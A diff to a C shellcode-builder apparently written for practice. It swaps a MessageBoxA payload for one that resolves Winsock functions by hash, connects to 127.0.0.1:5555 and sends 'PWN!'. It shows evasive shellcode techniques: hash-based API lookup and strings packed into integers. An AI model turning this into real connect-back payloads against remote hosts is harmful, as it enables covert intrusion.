@@ -1,39 +1,62 @@
-﻿#include <windows.h>
-#include <winternl.h>
+﻿#include "common.h"
+#include "api.h"
 #include "shellcode.h"
 
 #pragma comment(linker, "/Entry:Entry")
 
-#define ROTR32(value, shift)	(((DWORD) value >> (BYTE) shift) | ((DWORD) value << (32 - (BYTE) shift)))
-#define LOADLIBRARYA_HASH				0x0726774c
-#define MESSAGEBOXA_HASH				0x07568345
-#define GETPROCADDRESS_HASH				0x7802f749
+#define CHECK(func) if(func == NULL){goto end;}
+#define CHECKNULL(func) if(func != 0){goto end;}
+#define HTONS(A) ((((unsigned short int)(A) & 0xff00) >> 8) | (((unsigned short int)(A) & 0x00ff) << 8))
 
 #define HASH_LoadLibraryA               0x071d2c76
+#define HASH_GetProcAddress             0xc2cbc15a
 #define HASH_MessageBoxA                0x4ce54ccf
 #define HASH_ExitProcess                0xcbff6bb9
-
-typedef  void* (WINAPI* WinAPIPtr)();
-typedef  void* (__cdecl* CFuncPtr)();
-typedef ULONG_PTR(WINAPI* GETPROCADDRESS)(HMODULE, LPCSTR);
-typedef HMODULE(WINAPI* LOADLIBRARYA)(LPCSTR);
-typedef NTSTATUS(WINAPI* LDRLOADDLL)(PWCHAR, ULONG, PUNICODE_STRING, PHANDLE);
-typedef int (WINAPI* MESSAGEBOXA)(HWND, LPSTR, LPSTR, UINT);
+#define HASH_ExitThread                 0x451d7512
+#define HASH_WSAStartup                 0x2b7ae73e
+#define HASH_socket                     0x1451fe69
+#define HASH_inet_addr                  0xbf92328a
+#define HASH_inet_pton                  0xbf9ab1b0
+#define HASH_connect                    0xcfb6b06a
+#define HASH_send                       0x0040cbca
+#define HASH_recv                       0x00403e10
+#define HASH_closesocket                0x5de2e91f
+#define HASH_WSACleanup                 0x496ccc33
 
 typedef struct _ADDRESS_TABLE
-{//TODO: 添加退出线程功能
-	PVOID        Kernel32_BaseAddr;
-	LOADLIBRARYA LoadLibraryA;
-	WinAPIPtr    ExitProcess;
+{
+	PVOID Kernel32_BaseAddr;
+	PVOID NTdll_BaseAddr;
+	HMODULE User32;
+	HMODULE ws2_32;
 
-	DWORD        sz_String[2];
-	DWORD        user[4];
+	T_htons          phtons;
+	T_socket         pSocket;
+	T_gethostbyname  pGetHost;
+	T_ExitThread     pExitthread;
+	T_WSAStartup     pWSAStartup;
+	T_WSACleanup     pWSAcleanup;
+	T_LoadLibrary    pLoadLibrary;
+	T_ExitProcess    pExitProcess;
+	T_GetProcAddress pGetProcAddress;
+	T_inet_pton      pinetpton;
+	T_connect        pConnect;
+	T_send           pSend;
+	T_recv           pRecv;
+	T_closesocket    pClosesock;
 	
-	HMODULE      User32_BaseAddr;
-	WinAPIPtr    WinExec;
+
+	DWORD sz_String[2];
+	DWORD sz_Local[4];
+	
+	DWORD winsock[4];
 	
 	
-	WinAPIPtr    MessageBoxA;
+
+	SOCKET  sock;
+
+
+
 
 
 }ADDRESS_TABLE;
@@ -72,26 +95,63 @@ void CreateShellCode() {
 	CloseHandle(hFile);
 }
 
-// shellcode���߼�
+
 int EntryMain() { 
 	ADDRESS_TABLE Addrs;
+	WSADATA wsaData;
+	SOCKADDR_IN sockAddr;
+	memset(&sockAddr, 0, sizeof(sockAddr));
+	//初始化api
 	Addrs.Kernel32_BaseAddr = GetKernel32Base();
-	Addrs.LoadLibraryA = GetProcAddrByHash(Addrs.Kernel32_BaseAddr, HASH_LoadLibraryA);
-	Addrs.ExitProcess = GetProcAddrByHash(Addrs.Kernel32_BaseAddr, HASH_ExitProcess);
-	Addrs.user[0] = 0x72657375;
-	Addrs.user[1] = 0x642e3233;
-	Addrs.user[2] = 0x00006c6c;
-	Addrs.User32_BaseAddr = Addrs.LoadLibraryA(Addrs.user);
-	Addrs.MessageBoxA = GetProcAddrByHash(Addrs.User32_BaseAddr, HASH_MessageBoxA);
+	Addrs.pExitProcess = GetProcAddrByHash(Addrs.Kernel32_BaseAddr, HASH_ExitProcess);
+	Addrs.pLoadLibrary = GetProcAddrByHash(Addrs.Kernel32_BaseAddr, HASH_LoadLibraryA);
+	Addrs.pGetProcAddress = GetProcAddrByHash(Addrs.Kernel32_BaseAddr, HASH_GetProcAddress);
+	CHECK(Addrs.pLoadLibrary);
+	CHECK(Addrs.pGetProcAddress);
+	Addrs.winsock[0] = 0x5f327357;  //string "Ws2_32.dll"
+	Addrs.winsock[1] = 0x642e3233;
+	Addrs.winsock[2] = 0x00006c6c;
+	Addrs.ws2_32 = Addrs.pLoadLibrary(Addrs.winsock);
+	CHECK(Addrs.ws2_32);
+	Addrs.pWSAStartup = GetProcAddrByHash(Addrs.ws2_32, HASH_WSAStartup);
+	Addrs.pinetpton = GetProcAddrByHash(Addrs.ws2_32, HASH_inet_pton);
+	Addrs.pSocket = GetProcAddrByHash(Addrs.ws2_32, HASH_socket);
+	Addrs.pConnect = GetProcAddrByHash(Addrs.ws2_32, HASH_connect);
+	Addrs.pSend = GetProcAddrByHash(Addrs.ws2_32, HASH_send);
+	Addrs.pRecv = GetProcAddrByHash(Addrs.ws2_32, HASH_recv);
+	Addrs.pClosesock = GetProcAddrByHash(Addrs.ws2_32, HASH_closesocket);
+	Addrs.pWSAcleanup = GetProcAddrByHash(Addrs.ws2_32, HASH_WSACleanup);
+	CHECK(Addrs.pWSAStartup);
+	CHECK(Addrs.pinetpton);
+	CHECK(Addrs.pSocket);
+	CHECK(Addrs.pConnect);
+	CHECK(Addrs.pSend);
+	CHECK(Addrs.pRecv);
+	CHECK(Addrs.pClosesock);
+	CHECK(Addrs.pWSAcleanup);
+	CHECKNULL(Addrs.pWSAStartup(MAKEWORD(2, 2), &wsaData));
+	Addrs.sock = Addrs.pSocket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+	Addrs.sz_Local[0] = 0x2e373231;//127.0.0.1
+	Addrs.sz_Local[1] = 0x2e302e30;
+	Addrs.sz_Local[2] = 0x00000031;
+	sockAddr.sin_family = AF_INET;
+	sockAddr.sin_port = HTONS(5555);
+	Addrs.pinetpton(AF_INET, Addrs.sz_Local, &sockAddr.sin_addr);
+	CHECKNULL(Addrs.pConnect(Addrs.sock, (sockaddr*)&sockAddr, sizeof(sockAddr)));
 	Addrs.sz_String[0] = 0x214e5750;
 	Addrs.sz_String[1] = 0x00000000;
-	Addrs.MessageBoxA(0, Addrs.sz_String, 0, MB_OK);
-	Addrs.ExitProcess();
-	
-	
+	Addrs.pSend(Addrs.sock, Addrs.sz_String, 8, 0);
+	Addrs.pClosesock(Addrs.sock);
+	Addrs.pWSAcleanup();
 
 
-	 return 0;
+	
+	
+	
+	
+end:
+	Addrs.pExitProcess(0);
+	return 0;
 }
 
 HMODULE GetKernel32Base() 
